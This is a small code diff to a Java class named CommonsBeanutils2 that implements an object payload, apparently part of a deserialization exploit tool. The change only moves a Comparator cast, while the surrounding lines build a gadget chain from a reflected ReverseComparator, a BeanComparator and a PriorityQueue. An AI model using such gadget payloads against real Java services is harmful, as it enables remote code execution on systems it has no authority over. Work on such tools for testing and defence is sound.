@@ -20,9 +20,9 @@ public class CommonsBeanutils2 implements ObjectPayload<Object> {
 
         Constructor constructor = Reflections.getFirstCtor("java.util.Collections$ReverseComparator");
         Reflections.setAccessible(constructor);
-        Object obj = constructor.newInstance();
+        Comparator obj = (Comparator) constructor.newInstance();
 
-        final BeanComparator comparator = new BeanComparator(null, (Comparator) obj);
+        final BeanComparator comparator = new BeanComparator(null, obj);
 
         final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
         // stub data for replacement later
